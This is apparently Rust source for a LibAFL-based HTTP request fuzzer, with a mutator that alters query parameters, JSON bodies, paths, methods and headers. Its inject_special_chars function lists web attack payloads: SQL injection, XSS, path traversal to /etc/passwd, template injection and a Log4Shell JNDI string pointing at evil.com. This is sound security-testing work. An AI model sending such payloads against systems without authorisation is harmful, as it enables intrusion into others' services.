use std::borrow::Cow;
use std::num::NonZeroUsize;

use libafl::corpus::CorpusId;
use libafl::mutators::{MutationResult, Mutator};
use libafl::state::HasRand;
use libafl::Error;
use libafl_bolts::Named;
use libafl_bolts::rands::Rand;

use super::input::FuzzHttpRequest;

fn nz(val: usize) -> NonZeroUsize {
    NonZeroUsize::new(val).unwrap()
}

#[derive(Debug)]
pub struct HttpRequestMutator {
    name: Cow<'static, str>,
}

impl HttpRequestMutator {
    pub fn new() -> Self {
        Self {
            name: Cow::Borrowed("http_request_mutator"),
        }
    }
}

impl Named for HttpRequestMutator {
    fn name(&self) -> &Cow<'static, str> {
        &self.name
    }
}

impl<S> Mutator<FuzzHttpRequest, S> for HttpRequestMutator
where
    S: HasRand,
{
    fn mutate(&mut self, state: &mut S, input: &mut FuzzHttpRequest) -> Result<MutationResult, Error> {
        let choice = state.rand_mut().below(nz(6));

        match choice {
            0 => mutate_query_params(state, input),
            1 => mutate_body(state, input),
            2 => mutate_url_path(state, input),
            3 => inject_special_chars(state, input),
            4 => mutate_method(state, input),
            _ => mutate_headers(state, input),
        }

        Ok(MutationResult::Mutated)
    }

    fn post_exec(&mut self, _state: &mut S, _new_corpus_id: Option<CorpusId>) -> Result<(), Error> {
        Ok(())
    }
}

fn mutate_query_params<S: HasRand>(state: &mut S, input: &mut FuzzHttpRequest) {
    let action = state.rand_mut().below(nz(3));
    match action {
        0 => {
            let key = format!("fuzz_param_{}", state.rand_mut().below(nz(100)));
            let value = generate_fuzz_value(state);
            input.query_params.insert(key, value);
        }
        1 => {
            if let Some(key) = input.query_params.keys().next().cloned() {
                input.query_params.insert(key, generate_fuzz_value(state));
            }
        }
        _ => {
            if let Some(key) = input.query_params.keys().next().cloned() {
                input.query_params.remove(&key);
            }
        }
    }
}

fn mutate_body<S: HasRand>(state: &mut S, input: &mut FuzzHttpRequest) {
    let action = state.rand_mut().below(nz(5));
    match action {
        0 => input.body = None,
        1 => input.body = Some("null".to_string()),
        2 => input.body = Some("{}".to_string()),
        3 => input.body = Some("[]".to_string()),
        _ => {
            if let Some(body) = &input.body {
                if let Ok(mut val) = serde_json::from_str::<serde_json::Value>(body) {
                    mutate_json_value(state, &mut val);
                    input.body = Some(val.to_string());
                }
            } else {
                let val = generate_fuzz_value(state);
                input.body = Some(format!("{{\"fuzz\": \"{}\"}}", val));
            }
        }
    }
}

fn mutate_url_path<S: HasRand>(state: &mut S, input: &mut FuzzHttpRequest) {
    let action = state.rand_mut().below(nz(3));
    match action {
        0 => {
            input.url.push_str("/../");
        }
        1 => {
            let extra = generate_fuzz_value(state);
            input.url.push('/');
            input.url.push_str(&extra);
        }
        _ => {
            if let Some(pos) = input.url.rfind('/') {
                let fuzz = generate_fuzz_value(state);
                input.url.truncate(pos + 1);
                input.url.push_str(&fuzz);
            }
        }
    }
}

fn inject_special_chars<S: HasRand>(state: &mut S, input: &mut FuzzHttpRequest) {
    let payloads: &[&str] = &[
        "'OR 1=1--",
        "<script>alert(1)</script>",
        "../../../etc/passwd",
        "%00",
        "\n\r\n",
        "{{7*7}}",
        "${jndi:ldap://evil.com}",
    ];

    let idx = state.rand_mut().below(nz(payloads.len()));
    let payload = payloads[idx].to_string();

    let target = state.rand_mut().below(nz(3));
    match target {
        0 => {
            input.query_params.insert("injection".to_string(), payload);
        }
        1 => {
            if let Some(body) = &mut input.body {
                *body = format!("{{\"data\": \"{}\"}}", payload.replace('"', "\\\""));
            }
        }
        _ => {
            input.url.push('/');
            input.url.push_str(&payload);
        }
    }
}

fn mutate_method<S: HasRand>(state: &mut S, input: &mut FuzzHttpRequest) {
    let methods = ["GET", "POST", "PUT", "DELETE", "PATCH"];
    let idx = state.rand_mut().below(nz(methods.len()));
    input.method = methods[idx].to_string();
}

fn mutate_headers<S: HasRand>(state: &mut S, input: &mut FuzzHttpRequest) {
    let action = state.rand_mut().below(nz(3));
    match action {
        0 => {
            input.headers.insert(
                "X-Fuzz-Header".to_string(),
                generate_fuzz_value(state),
            );
        }
        1 => {
            input.headers.insert(
                "Content-Type".to_string(),
                "text/xml".to_string(),
            );
        }
        _ => {
            input.headers.insert(
                "Authorization".to_string(),
                format!("Bearer {}", generate_fuzz_value(state)),
            );
        }
    }
}

fn mutate_json_value<S: HasRand>(state: &mut S, val: &mut serde_json::Value) {
    match val {
        serde_json::Value::Object(map) => {
            let action = state.rand_mut().below(nz(3));
            match action {
                0 => {
                    map.insert(
                        format!("fuzz_{}", state.rand_mut().below(nz(100))),
                        serde_json::Value::String(generate_fuzz_value(state)),
                    );
                }
                1 => {
                    if let Some(key) = map.keys().next().cloned() {
                        map.insert(key, serde_json::Value::Null);
                    }
                }
                _ => {
                    if let Some(key) = map.keys().next().cloned() {
                        map.insert(
                            key,
                            serde_json::Value::String(generate_fuzz_value(state)),
                        );
                    }
                }
            }
        }
        serde_json::Value::String(s) => {
            *s = generate_fuzz_value(state);
        }
        serde_json::Value::Number(_) => {
            *val = serde_json::Value::Number(
                serde_json::Number::from(state.rand_mut().below(nz(999999)) as i64),
            );
        }
        _ => {}
    }
}

fn generate_fuzz_value<S: HasRand>(state: &mut S) -> String {
    let choice = state.rand_mut().below(nz(6));
    match choice {
        0 => String::new(),
        1 => "A".repeat(10000),
        2 => format!("{}", state.rand_mut().below(nz(999999))),
        3 => "-1".to_string(),
        4 => "null".to_string(),
        _ => format!("fuzz_{}", state.rand_mut().below(nz(10000))),
    }
}
